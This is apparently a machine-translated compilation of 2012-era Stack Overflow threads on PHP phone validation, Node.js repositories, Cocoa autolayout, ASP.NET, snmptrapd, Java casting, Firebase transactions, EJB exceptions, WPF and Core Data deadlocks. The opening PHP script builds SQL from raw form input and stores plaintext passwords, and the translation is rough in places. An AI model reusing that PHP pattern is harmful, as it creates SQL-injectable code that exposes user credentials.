        $mysore = (in_array("mysore", $_POST['checkbox']) ? 1 : 0);
    }

    if ($mumbai + $pune + $banglore + $mysore == 0) {
        $error[] = 'Please check atleast one SMS center';
    }

    if ($accept != 1) {
        $error[] = 'Please check terms ';
    }

    if (empty($_POST['mobileno'])) {//if no name has been supplied 
        $error[] = 'Please Enter a Mobile Number '; //add to array "error"
    }
    if (empty($_POST['mobileno'])) {//if no name has been supplied 
        $error[] = 'Please Enter a Mobile Number '; //add to array "error"
    } else {

        $mobile = $_POST['mobileno']; //else assign it a variable

        /* if( preg_match("^[0-9]{10}", $mobile) ){

          }

          else {

          $error[] = 'Your Mobile No is invalid  ';
          } */
    }
    if (empty($_POST['fname'])) {//if no name has been supplied 
        $error[] = 'Please Enter a First name '; //add to array "error"
    } else {
        $fname = $_POST['fname']; //else assign it a variable
    }

    if (empty($_POST['lname'])) {//if no name has been supplied 
        $error[] = 'Please Enter a Last name '; //add to array "error"
    } else {
        $lname = $_POST['lname']; //else assign it a variable
    }
    if (empty($_POST['email'])) {
        $error[] = 'Please Enter your Email ';
    } else {
        if (preg_match("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+([a-zA-Z0-9\._-]+)+$/", $_POST['email'])) {
            //regular expression for email validation
            $email = $_POST['email'];
        } else {
            $error[] = 'Your EMail Address is invalid  ';
        }
    }

    if (empty($_POST['passwd1'])) {
        $error[] = 'Please Enter Your Password ';
    } else {
        $password = $_POST['passwd1'];
    }
    if (empty($_POST['passwd2'])) {
        $error[] = 'Please Verify Your Password ';
    } else {
        $password = $_POST['passwd2'];
    }
    if ($_POST["passwd1"] != $_POST["passwd2"]) {
        $error[] = 'Password does not match';
    }

    if (empty($error)) { //send to Database if there's no error ' //If everything's OK...
        // Make sure the mobile no is available:
        $query_verify_mobileno = "SELECT * FROM userdtls WHERE mobileno = '$mobile'";
        $result_verify_mobileno = mysqli_query($dbc, $query_verify_mobileno);
        if (!$result_verify_mobileno) {//if the Query Failed ,similar to if($result_verify_mobileno==false)
            echo ' Database Error Occured ';
        }

        if (mysqli_num_rows($result_verify_mobileno) == 0) { // IF no previous user is using this number .
            // Create a unique  activation code:
            //$activation = md5(uniqid(rand(), true));
            $query_insert_user = "INSERT INTO userdtls ( mobileno, serviceprovider, pass,  fname, lname, email, citystate, MUM, PUN, BNG, MYS ) VALUES ( '" . $mobile . "', '" . $serviceprovider . "', '" . $password . "', '" . $fname . "', '" . $lname . "', '" . $email . "', '" . $citystate . "','" . $mumbai . "', '" . $pune . "', '" . $banglore . "', '" . $mysore . "'  )";
        }
    }
} 
```

现在我陷入手机号码验证中。我尝试使用正则表达式。

我想要做的是添加一个 10 位数的电话号码，并确保它只是数字，否则会出错，并且在将号码输入数据库时​​，我想在手机号码 0 上添加一个前缀，所以它应该像 0and10digitnumber

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:02:19.320

尝试这样的事情：

```
$phoneNumber = $_POST['mobileno'];

if(!empty($phoneNumber)) // phone number is not empty
{
    if(preg_match('/^\d{10}$/',$phoneNumber)) // phone number is valid
    {
      $phoneNumber = '0' . $phoneNumber;

      // your other code here
    }
    else // phone number is not valid
    {
      echo 'Phone number invalid !';
    }
}
else // phone number is empty
{
  echo 'You must provid a phone number !';
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-03-02T20:08:12.697

可能最有效和最易读的形式是使用 Google 的**libphonenumber**库。**PHP fork**[在 GitHub 上](https://github.com/giggsey/libphonenumber-for-php)可用。它不仅可以帮助您验证号码本身，还可以使用它检查国家/地区代码，甚至可以知道某个**号码是否对特定国家/地区有效**（此库知道哪些号码前缀对许多国家/地区有效）。例如：`07700 900064`是有效的 GB 编号，但`09700 900064`不是，即使它们具有**相同的长度**。

以下是我在您的应用中验证手机号码的方法：

```
$phoneNumber = $_POST['mobileno'];
$countryCode="GB";

if (!empty($phoneNumber)) { // phone number is not empty
    $phoneUtil = \libphonenumber\PhoneNumberUtil::getInstance();
    $mobileNumberProto = $phoneUtil->parse($phoneNumber, $countryCode);
    if ($phoneUtil->isValidNumber($mobileNumberProto)) { // phone number is valid
        //here you know that number is valid, let's try to format it without country code but with 0 at the beginning (national number format)
        $phoneNumber = $mobileNumberProto->format($mobileNumberProto, PhoneNumberFormat::NATIONAL);
    } else {
        $error[] = 'Phone number not valid!';
    }
} else {
    $error[] = 'You must provide a phone number!';
} 
```

`$countryCode`是两个字符的**ISO 3166-1**代码。[您可以在Wikipedia](http://en.wikipedia.org/wiki/Country_codes:_A)上查看您所在国家/地区的信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-28T10:01:11.140

对于印度手机号码，这将是最简单的

```
if(is_numeric($num)){
if($num>=1000000000 && $num<=9999999999){
$num="0".$num;
}
else{
echo "Invalid Mobile Number";
}
}
else{
echo "Hey Buddy mobile numbers are always in digits";
} 
```

这个想法让我印象深刻，因为愿意找到容易和一些短小的想法，因为数字（1000000000）是最低的数值（10位），而数字（9999999999）是可以用作手机号码的最高数值在印度。还有一件事代码将比其他解决方案运行得更快。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T22:03:16.633

您是否尝试过像这样的正则表达式：

```
if( !preg_match("/^([0-1]-)?[0-9]{3}-[0-9]{3}-[0-9]{4}$/i", $phone) ) {
   echo 'Please enter a valid phone number';
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-06-30T12:07:21.553

```
if(!ereg("^[7-9]{1}[0-9]{9}$", $mob)) { return false; } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-01-17T21:21:30.683

改进 pravin tripathi 的回答：

> `if(!ereg("^[7-9]{1}[0-9]{9}$", $mob)) { return false; }`

由于 ereg() 已被弃用，您可以使用

```
preg_match("/^[7-9]{1}[0-9]{9}$/i", $mobile_no) 
```

这将帮助您验证来自印度的手机号码，因为它们是 10 位数字，并且从今天开始以 7、8 或 9 开头。如果引入新数字，您总是可以更改模式。

# node.js - DDD 和 Node.js：拥有带有异步回调的存储库的好习惯？

> ID：11786413
> 
> 赞同：3
> 
> 时间：2012-08-02T21:58:00.170
> 
> 标签：node.js, asynchronous, repository, domain-driven-design

事情是这样的：

*   客户端不应该知道存储库使用的持久性机制
*   例如，当使用 MongoDB 作为持久性存储实现存储库时，检索值是通过异步回调完成的
*   同步调用仍然可以使用回调来实现，异步调用必须使用回调来实现。（或期货等，但我不想去那里）

对我来说意味着存储库（至少对于获取）应该在接口中定义一个回调，即使实现恰好是同步的，例如：

```
var repo = {
    cache: {},
    getById: function(id,callback){
        callback(null,this.cache[id]); 
    }
} 
```

因为我可能（将）很快将其更改为：

```
var repo = {
    getById: function(id,callback){
        mongoose.findOne({_id:id},callback);
    }
} 
```

恕我直言，对于 C/U/D，同样的需求主要来自持久层的错误报告。

简而言之：您是否认为使用异步回调定义存储库（在 Nodejs 中，虽然并不真正相关）是最佳实践？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T04:16:29.627

如果周围的应用程序代码的其余部分也是异步的，我会认为这是一个很好的做法。从技术上讲，这当然是一个很好的做法，因为存储库是 IO 绑定的，并且保持阻塞调用线程是没有意义的。问题是异步回调会导致[延续传递风格](http://en.wikipedia.org/wiki/Continuation-passing_style)，这会导致学习曲线和大多数语言的摩擦。

# macos - 自动布局 - NSTextField 和 NSDatePicker [PIC] 的默认间距不同

> ID：11786416
> 
> 赞同：1
> 
> 时间：2012-08-02T21:58:12.733
> 
> 标签：macos, cocoa, appkit, spacing, autolayout

我正在使用自动布局来组织我的视图。我目前处于项目的测试/设计阶段，我只是想让它正常工作。

我在一个窗口内堆叠了许多元素，我正在使用视觉格式语言来分隔视图之间的垂直距离。

这是VFL：

```
[contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:|-[findField]-[replaceField]-[popField]-[textView(==60)]-[picker]-[picker2]-[textView2(==60)]-(>=20)-|" options:NSLayoutFormatAlignAllLeading metrics:nil views:views]]; 
```

这就是它的实际样子：

![在此处输入图像描述](../Images/a466633649815bd53eff523c70a9b066.png)

即使所有元素都由相同的“-”标识符分隔，但实际空间是不同的。看起来 NSDatePicker 的偏移量似乎比窗口中的所有其他视图都小。

为什么是这样？

# asp.net - ASP.net vb code behinddeployed 编译错误

> ID：11786417
> 
> 赞同：0
> 
> 时间：2012-08-02T21:58:15.197
> 
> 标签：asp.net, compilation

背景：我不是 ASP 开发人员，我了解 OOP 流程，并且可以使用 Javascript、Actionscript 进行编程，并且正在学习 PHP。我曾经以有限的方式了解 VB.net。

我被迫（通过现有的平台配置）开发一个小的 .aspx 页面，我已经阅读了很多教程，但无法让下面的页面正常工作。我能得到的最好的结果是 500 错误消息，但即使配置了详细的错误消息，也没有列出详细信息。我无法访问 Visual Studios，因为我正在使用 Dreamweaver 进行开发。

我正在尝试使用第一次查看页面时编译的编译方法而不是预编译

我似乎无法让这个基本的“hello world”类型页面工作。我究竟做错了什么？

*编辑代码以表示对* **CurrentNews.aspx所做的更改**

```
<%@ Page Language="vb" AutoEventWireup="false"  Src="/Scripts/CurrentNews.aspx.vb" Inherits="NewsFunctionality" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>News</title>
<link rel="stylesheet" type="text/css" href="CSS/NewsLayoutOne.css"/>
</head>
<body>
    <div class="OuterDiv" runat="server">
        <img id="NewsImage" src="Images/DefaultNews1.png" >
        <div id="NewsBody" runat="server">Original Text</div>
    </div>
</body>
</html> 
```

**当前新闻.aspc.vb**

```
' VB Document 
```

Class NewsFunctionality Inherits System.Web.UI.Page '关于链接到此类文件的页面的加载事件 protected sub Page_Load(sender As Object, e As System.EventArgs) Handles Me.Load NewsBody.InnerHTML = "

生成的动态文本。

"结束子

结束类

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:03:22.593

一眼看去，我会说至少你的代码不会像你期望的那样。您正在将“ `<P>Dynamic Text Generated</P>`”放入输入字段中进行渲染。

除此之外，虽然我没有看到任何明显行不通的东西。你看到的行为是什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:09:24.610

你的`Page_Load`潜艇应该被声明为受保护的。aspx 页面和 aspx.vb 类之间的关系有点像继承。

# postgresql - 将 snmptrapd 重定向到 postgres 或消息队列

> ID：11786419
> 
> 赞同：0
> 
> 时间：2012-08-02T21:58:23.490
> 
> 标签：postgresql, snmp, mqueue, snmptrapd

我需要收集 snmptraps 并将它们显示在 Web 界面中。该应用程序已经包含 *ruby on rails *linux *delayed_job（用于排队） *postgresql *一些执行 snmp 查询的 cron 作业

现在我需要运行类似 snmptrapd 的东西来收集警报。snmptrapd 是否有可能将其陷阱写入我可以使用 cron 作业处理的队列。像 linux 的内置 mqueue 这样的东西会很棒。甚至将其写入 postgresql 数据库（我知道它支持 mysql，但在任何地方都没有提到 postgres）

有谁知道我如何将 snmptrapd 的输出重定向到我可以使用 cron 作业处理的内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T12:45:25.503

我在 Perl 中做了类似的事情，但你也可以用 Ruby 来做。

首先，您需要告诉 snmptrapd 谁是陷阱的默认处理程序。在 snmptrapdconf 中，您可以将其定义如下：

```
traphandle default /yourpluginpath/yourplugin 
```

现在每次发生陷阱时，它的数据都会发送到您的插件。现在由他来处理。获得数据包后，您可以将其存储到所需的任何数据库中，无论是 MySQL 还是 PostgreSQL。

唯一的问题是解析来自陷阱的数据的库。在 Perl 中，我使用[了 SNMP::Trapinfo](http://search.cpan.org/~tonvoon/SNMP-Trapinfo-1.02/lib/SNMP/Trapinfo.pm)，但由于我从未使用过 Ruby，所以我不知道等价的东西，我相信其他人可以将您指向正确的库。你甚至可以自己解析它。实际上，如果您希望其他人将数据存储到数据库中，您也可以使用基本的 shell 脚本。

# java - Java：从对象转换为其他数据类型的处理器成本

> ID：11786422
> 
> 赞同：1
> 
> 时间：2012-08-02T21:58:36.370
> 
> 标签：java, object

我正在处理一个处理项目列表的 Java 项目，其中每个项目都有一个 int 类型的 id 和一个 String 类型的值。然后我有另一种称为 ItemCollection 的类型，它在内部具有列表并公开添加、删除、获取项目等的方法。

该应用程序是一个金融交易网关，因此我们非常关注性能，因为该应用程序每秒将接收许多交易。我的问题是：

将 String 转换为另一种类型（如 Integer、Char、Date 等）的成本与转换包含 Integer、Char、Date 等的 Object 的成本相同吗？

澄清一下，目前 Item 的值是以字符串格式处理的。该项目有一个名为 getValue() 的方法，它以字符串形式返回项目的值。但有时必须将此值转换为另一种类型，例如 int。所以我打算做的是将值的根类型更改为 Object 并公开 getString()、getInt()、getDate()、getChar() 等方法，其中值将从 Object 转换为具体的数据类型。当然，如果值不能被转换将返回空/零/等。

根据您的经验，最好的方法是什么？从 Object 转换为 int 是否与从 String 转换为 int 相同？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:06:33.423

根据您提供的详细程度，我的建议是：**不要这样做！**.

找到一种使用 Java 类型系统对数据建模的方法。避免类型转换（例如 String 到 Integer），并避免类型转换（例如`(String)someObject`）。

如果您对特定操作（例如整数的`toString`函数）有疑问，那么我建议您查阅文档或源代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:08:57.337

如果您需要比我建议更好的性能，那么使用较低级别的语言（如`C++`. 也许使用函数式语言（如`Erlang`. 如果您想使用 Java，那么您应该避免标记类型并使用该语言提供的类型系统。标记类并不比实际的 java 类快多少。标记类是 Java 中过时的编程风格。例如，如果您需要转换`String`为`Date`，则此操作将比`instanceof`操作员执行的转换慢得多。在 Java 中还有`Stop the world`GC 暂停，这对于实时应用程序来说可能是致命的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:18:32.730

谁在生产这些物品？它们不是以某种格式（例如 JSON 或 XML）提供给您，您实际上可以将数据编组为它们的真实类型吗？

例如，如果您收到类似以下内容的 JSON 消息：

```
date: 2012-12-25
acct: 12345
amount: 123.50 
```

那么就在此时您应该将它们放入正确的类型中。

您似乎想根据项目的类型发送消息或对项目执行操作，并且您正在尝试使用该类型转换它们。我不想回答你的问题，但你希望如何做到这一点？您是否首先尝试查看该项目是否为日期？然后如果不是，试着看看它是否是一个数字？什么优先？

如果你有一个`Item`需要处理的......并且你可以（如我之前所说，通过将输入数据编组为不同的类型，而不是字符串）得到 a`StringItem`和 a `DateItem`，例如，你可以使用访问者模式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-03T14:10:23.467

这取决于您所说的“转换”是什么意思。这在 Java 中并不是一个精确的艺术术语。

如果你的意思是“演员”，那么答案是演员很快。你的`ItemCollection`类可能有这样的方法：

```
public int getInt(int index) {
    Object value = getObject(index);
    return (Integer)value;
} 
```

演员将添加一些机器指令。

如果您的意思更像“解析”，那么答案是解析比强制转换慢数百或数千倍，但与 I/O 相比仍然快。如果您正在解析，您的代码可能如下所示：

```
public int getInt(int index) {
    String value = getString(index);
    return Integer.parseInt(value);
} 
```

那么，“转换”到底是什么意思？

# firebase - 添加到列表时类似于 Firebase 事务（）的功能？

> ID：11786428
> 
> 赞同：4
> 
> 时间：2012-08-02T21:59:01.643
> 
> 标签：firebase

这是一个相当复杂的问题，但我会尽量简单明了地解释它......

我正在使用 Firebase 构建一个基于网络的多用户游戏。我保留了游戏中每一轮的列表。在一轮结束时，每个用户都会看到一个“开始”按钮，当他们准备好开始下一轮时，他们会单击该按钮。当至少 50% 的用户点击“开始”时，该回合开始。

我有一个`gameRef`游戏的 Firebase 参考，一个`roundListRef`代表轮次列表的参考，以及一个`roundRef`代表当前轮次的参考。

我附加了一个`child_added`回调，`roundListRef`以便在添加新一轮时，它成为每个人的当前轮：

```
roundListRef.on('child_added', function(childSnapshot, prevChildName) {
    roundRef = childSnapshot.ref();
}); 
```

我可以从那里轻松跟踪`newRoundVotes`和`activePlayers`计算 50%。如果达到50%，则增加一个新的回合，触发每个人的`child_added`事件，新的回合将从那里开始……

```
gameRef.child('newRoundVotes').on('value', function(snapshot) {
    var newRoundVotes = snapshot.val();

    gameRef.child('activePlayers').once('value', function(snapshot) {
        var activePlayers = snapshot.val();

        if (newDriveVotes / activePlayers >= 0.5)
            addNewRound();
    });
}); 
```

我的问题是，我如何确保只添加一个新回合，并且每个人都在同一回合中？

例如，假设有 10 名玩家和 4 人已经投票开始下一轮。如果第 6 位玩家在第 5 位玩家触发他的事件之前投票`child_added`，则也将为第 6 位玩家添加一轮。

问题类似于`.set()`vs `.transaction()`，但不完全相同（根据我的理解）。

有没有人有办法解决吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:35:06.367

我认为如果提前知道回合名称，您可能可以通过交易解决这个问题。例如，如果您只使用 /round/0、/round/1、/round/2 等。

然后你可以有一些代码，如：

```
function addNewRound() {
    var currentRound = Number(roundRef.name());
    var nextRound = currentRound + 1;

    // Use a transaction to try to create the next round.
    roundRefList.child(nextRound).transaction(function(newRoundValue) {
        if (newRoundValue == null) {
            // create new round.
            return { /* whatever should be stored for the round. */ };
        } else {
            // somebody else already created it.  Do nothing.
        }
    });
} 
```

这适用于您的场景吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:40:14.110

您可以稍微修改您的想法并使用圆形计数器作为跟踪并发的地方。

```
currentRound = 0;
currentRoundRef.on('value', function(snapshot) {
   currentRound = snapshot.val();
   roundRef = roundListRef.child(currentRound);
});

function addNewRound() {
    currentRoundRef.transaction( function(current_value) {
       if( current_value !== currentRound ) {
          // the round timer has been updated by someone else
          return;
       }
       else {
          return currentRound + 1;
       }
    }, function(success) {
       // called after our transaction succeeds or fails
       if( success ) {
          roundListRef.child(currentRound+1).set(...);
       }
    });
} 
```

# exception - 将异常堆栈从 ejb 3 传播到 portlet

> ID：11786434
> 
> 赞同：0
> 
> 时间：2012-08-02T21:59:41.657
> 
> 标签：exception, logging, ejb-3.0, portlet

我有一个远程调用 ejb 3 的 spring mvc portlet。现在，当 ejb 抛出异常时，在门户端我只看到“EJB 异常”。我无权访问实际的 ejb 3 日志。那么我该怎么做才能使整个异常堆栈跟踪在门户端可用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T15:57:20.727

您可以捕获 EJBException（请注意，它是 RuntimeException，因此，您的代码不是“必须”捕获它），然后调用[getCausedByException](http://docs.oracle.com/javaee/6/api/javax/ejb/EJBException.html#getCausedByException%28%29 "getCausedByException")方法来访问原始异常。有了它，你可以做任何你想做的事情，包括重新抛出它。

# c# - （大致）任何类型的属性的“通用”控件？

> ID：11786435
> 
> 赞同：4
> 
> 时间：2012-08-02T21:59:42.173
> 
> 标签：c#, wpf, windows, reflection

所以我只是想知道，由于我的研究没有产生任何结果，是否有任何免费可用的控件（最好是 WPF），即本质上是任何类型属性的“通用”控件？

例如，假设您正在提供一个所见即所得的表单构造函数，并且您希望支持多种值类型 - 字符串、布尔值、整数、日期时间、浮点数等。当然，任何这些类型的列表也是...我想知道的是，是否已经有一个控件，当绑定到该控件时，它将检测属性的类型，然后为该类型呈现适当类型的控件。那是：

对于一个 int，一个带有向上/向下按钮的文本框，并验证它是一个整数 对于一个日期时间，一个日期时间选择器 对于一个日期时间列表，也许是一个自定义控件，它结合了一个列表框和一个日期时间选择器，它可以让你添加/根据需要删除日期时间...

我想写一个相对简单，但很难有效地处理所有不同的类型，当然它不能处理更复杂的类型......

有人知道吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:18:15.977

这种类型的控件通常称为`PropertyGrid`.

查看这些控件，看看它们是否适合您的需求：

1.  [WPF 属性网格](http://wpg.codeplex.com/)
2.  [WPF PropertyGrid 控件](http://wpfpropertygrid.codeplex.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:32:15.887

如果您使用自己的控件，则可以相当轻松地提供此功能，并结合同类最佳控件来执行特定任务，例如数字编辑器和日期组合。

我们最初搜索了一个包罗万象的控件，但像您一样，找不到一个。因此，我们推出了自己的产品，支持超过 15 种不同的数据呈现类型。整个控件，包括注释，只有大约 1500 行，其中包含许多特定于我们的应用程序的功能，但我们也能够融入各种第三方控件。

我们在不同用例中使用的另一种方法是创建一个通用控件接口（即设置值、获取值、您是否有效等），然后创建实现该接口的单一用途自定义控件。

然后要对控件执行批量操作，只需在控件的容器列表中循环，如果控件实现了我们的接口，则在该控件上执行接口操作。

这显着减少了我们必须编写的代码量，以便在所有控件中执行其他标准操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:15:04.573

这对您来说并不是一个完美的解决方案，但 Silverlight 有一个 DataForm，当绑定到自定义类型的对象时，它将生成一个带有适当属性控件的表单。它不包含在 WPF 中，但有一个[Silverlight 控件的 WPF 端口](http://wpfdataform.codeplex.com/)。

**编辑**

我错过了你问题的一部分，这对你来说更不是一个解决方案。不过它仍然可能会有所帮助，所以我将把它留在这里。

# objective-c - Core Data 嵌套的托管对象上下文和频繁的死锁/冻结

> ID：11786436
> 
> 赞同：32
> 
> 时间：2012-08-02T21:59:49.910
> 
> 标签：objective-c, ios, core-data, nsfetchedresultscontroller, nsmanagedobjectcontext

**我有一个问题与此人在此处描述的问题几乎相同，但尚未得到解答：**

[http://www.cocoabuilder.com/archive/cocoa/312683-core-data-nested-managed-object-contexts-and-frequent-deadlocks.html#312683](http://www.cocoabuilder.com/archive/cocoa/312683-core-data-nested-managed-object-contexts-and-frequent-deadlocks.html#312683)

**这是问题所在：**

我有一个带有 NSPrivateQueueConcurrencyType 的父 MOC 设置和一个持久存储协调器集，它有一个带有 NSMainQueueConcurrencyType 的子 MOC 设置。这个想法是大部分长期的努力和保存可以在私有 MOC 上完成，从而将主线程从阻塞 UI 中释放出来。不幸的是，我似乎遇到了几种导致死锁的情况。

如果子 MOC（在主线程上）正在使用 NSFetchedResultsController 执行获取，则向父上下文发送一个 -executeFetchRequest：它可以创建死锁。这两个操作都是在 performBlock: 的上下文中完成的，尽管文档似乎表明在没有 performBlock: 的主线程上使用主线程并发类型 MOC 很好。

似乎私有队列正在等待主线程上的子上下文已经锁定的 PSC 锁。似乎子上下文（同时持有 PSC 锁）正在尝试将 dispatch_sync 发送到父上下文，因此它们都在等待对方。

PriveQueue -> MainQueue 是受支持的配置吗？似乎大多数人在主线程上仍然有父上下文。

主线程如下所示：

> ```
> > #0    0x960f6c5e in semaphore_wait_trap ()
> > #1    0x04956bb5 in _dispatch_thread_semaphore_wait ()
> > #2    0x04955c8f in _dispatch_barrier_sync_f_slow ()
> > #3    0x04955dea in dispatch_barrier_sync_f ()
> > #4    0x01797de5 in _perform ()
> > #5    0x01798547 in -[NSManagedObjectContext(_NestedContextSupport) newValuesForObjectWithID:withContext:error:] ()
> > #6    0x0176416b in _PFFaultHandlerLookupRow ()
> > #7    0x01763f97 in -[NSFaultHandler fulfillFault:withContext:forIndex:] ()
> > #8    0x01763b75 in _PF_FulfillDeferredFault ()
> > #9    0x017639f2 in _sharedIMPL_pvfk_core ()
> > #10    0x017681a0 in _pvfk_11 ()
> > #11    0x0001b322 in -[FBUser sectionName] at /Users/mlink/Code/x/x/FBUser.m:62
> > #12    0x011a8813 in _NSGetUsingKeyValueGetter ()
> > #13    0x017a0652 in -[NSManagedObject valueForKey:] ()
> > #14    0x011ab8d5 in -[NSObject(NSKeyValueCoding) valueForKeyPath:] ()
> > #15    0x01851f72 in -[NSFetchedResultsController(PrivateMethods) _sectionNameForObject:] ()
> > #16    0x01853af6 in -[NSFetchedResultsController(PrivateMethods) _computeSectionInfo:error:] ()
> > #17    0x01850ea6 in -[NSFetchedResultsController performFetch:] ()
> > #18    0x0003a4fc in __62-[SYFriendsTableViewController updateFetchedResultsController]_block_invoke_0 ()
> > #19    0x01797af3 in developerSubmittedBlockToNSManagedObjectContextPerform ()
> > #20    0x049554f0 in _dispatch_main_queue_callback_4CF ()
> > #21    0x01b3e833 in __CFRunLoopRun ()
> > #22    0x01b3ddb4 in CFRunLoopRunSpecific ()
> > #23    0x01b3dccb in CFRunLoopRunInMode ()
> > #24    0x023d6879 in GSEventRunModal ()
> > #25    0x023d693e in GSEventRun ()
> > #26    0x0089aa9b in UIApplicationMain ()
> > #27    0x00002656 in main at /Users/mlink/Code/x/x/main.mm:16 
> ```

the private queue stack looks like this:

```
#0    0x960f8876 in __psynch_mutexwait ()
#1    0x97e9e6af in pthread_mutex_lock ()
#2    0x0172ec22 in -[_PFLock lock] ()
#3    0x0172ebfa in -[NSPersistentStoreCoordinator lock] ()
#4    0x01746a8c in -[NSManagedObjectContext(_NSInternalAdditions) lockObjectStore] ()
#5    0x01745030 in -[NSManagedObjectContext executeFetchRequest:error:] ()
#6    0x0009d49f in -[NSManagedObjectContext(Additions) executeFetchRequest:] at /Users/mlink/Code/objc/C/C/NSManagedObjectContext+Additions.m:44
#7    0x0002177f in +[FBUser usersForFbids:inManagedObjectContext:] at /Users/mlink/Code/x/x/FBUser.m:435
#8    0x00021fc0 in __77+[FBUser updateUserFromGraphValues:inManagedObjectContext:completionHandler:]_block_invoke_0 at /Users/mlink/Code/x/x/FBUser.m:461
#9    0x0180f9f3 in developerSubmittedBlockToNSManagedObjectContextPerform_privateasync ()
#10    0x04954ecf in _dispatch_queue_drain ()
#11    0x04954d28 in _dispatch_queue_invoke ()
#12    0x049544af in _dispatch_worker_thread2 ()
#13    0x97ea1b24 in _pthread_wqthread ()
#14    0x97ea36fe in start_wqthread () 
```

**He also writes this:**

I'm starting to think the problem is with NSFetchedResultsController which is always stuck at performFetch: when these deadlocks occur. Most of the time it will be stuck trying to fault in an object as a result of asking for it's section name. As a test I tried to reproduce what the FRC does and performed the executeFetchRequest: and then iterated through the results asking each object for it's section name. And this doesn't cause a deadlock. If I leave the FRC to do performFetch: after I do my test it will still deadlock there. I'm 99% sure that the FRC has a synchronization problem with nested contexts.

**Question: Does anybody know why this problem occurs? Do you know how to solve it? Is this a bug?**

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-08-10T11:36:54.313

I just read [this SO posting](https://stackoverflow.com/questions/11899875/core-data-multithread-store-relations/11900484#11900484) where fabrice truillot de chambrier recommends not to use nested contexts at present. He gives a reference to the article [Core Data Growing Pains](http://wbyoung.tumblr.com/post/27851725562/core-data-growing-pains) .

From that article:

> NSFetchedResultsController deadlocks
> 
> You never want your application to deadlock. With NSFetchedResultsController and nested contexts, it’s pretty easy to do. Using the same UIManagedDocument setup described above, executing fetch requests in the private queue context while using NSFetchedResultsController with the main queue context will likely deadlock. If you start both at about the same time it happens with almost 100% consistency. NSFetchedResultsController is probably acquiring a lock that it shouldn’t be. This has been reported as fixed for an upcoming release of iOS.
> 
> radar://11861499 fixed in an upcoming release

This seems to describe exactly your issue.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-03T03:14:43.043

For my iOS 6 app, I have the same concurrency setup as the OP - a parent MOC using a private queue and a child MOC on the main thread. I also have an NSFetchedResultsController which uses the child MOC to update a UITableViewController. Both these MOCs are initialized in the AppDelegate and are to be used across the app. The AppDelegate has two methods, *savePrivateThreadMOCToCoreData* and *saveMainThreadMOCToCoreData*, to persist changes to CD. At launch, I dispatch a coredata initializer on a private queue as follows. The idea is to immediately drop the user into the table view and allow the initializer to update core data in the background.

```
 dispatch_async(private_queue,^{
        [CoreDataInitializer initialize];
    }); 
```

Initially, when *savePrivateThreadMOCToCoreData* was doing saves in a -performBlock, I was seeing the same psynch_mutex deadlocks described in "[Core Data Growing Pains](http://wbyoung.tumblr.com/post/27851725562/core-data-growing-pains)" linked above. I also saw crashes if I tried reading data into the TableVC while the save was in progress.

```
 Collection <__NSCFSet: 0x7d8ea90> was mutated while being enumerated. 
```

To overcome these, I switched to doing saves using -performBlockAndWait. I stopped seeing deadlocks and crashes but it didn't feel right to make the UI wait for saves. Finally, I removed all calls to -performBlock* and used a plain vanilla [privateMOC save:&error] and just like that, all my issues disappeared. The fetched results controller reads partially saved data cleanly and updates the table, no more deadlocks or "mutated while being enumerated" errors.

I suspect *-performBlock** is supposed to be used by *other* threads, ones which didn't create the MOC in question, to request operations on it. Since both my private and main thread MOCs belong to the app delegate, saves on the private MOC should not use *-performBlock**.

It's probably relevant that though my build environment is iOS 6, my base deployment target SDK iOS 5.0\. Seems others aren't seeing this issue with iOS 6 any more.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-08T06:16:48.530

It happens to me because the parents are set up with NSMainQueueConcurencyType

To solve that I make the managedobjectcontext for mainQueue to be a child. I called reset everytime I want to load stuff to ensure that data on mainQueue is the same with the parent. It often isn't.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-01-07T07:41:55.973

I too got a crash related to *developerSubmittedBlockToNSManagedObjectContextPerform*.

In my case, consider the following method calling pattern:

```
[privatecontext performBlock:^{
    A(CDManager.privatecontext);
}]; 
```

where: A(CDManager.privateContext) calls B() B() calls C() C() calls D()

and: method A() and method C() contains some Core Data operations. A() already have the knowledge to which context to work on, but A() doesnt inform B() about the context and so C() too doesnt have any info about on which context to work on, so C() works on default context (main). and this causes the crash due to data inconsistently in db.

fix: all the methods which are to work on db operations are parametrized with the context they are to work on, except D() since it need not work on db operation, like:

A(context) calls B(context) B(context) calls C(context) C(context) calls D()

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-02-09T19:29:59.763

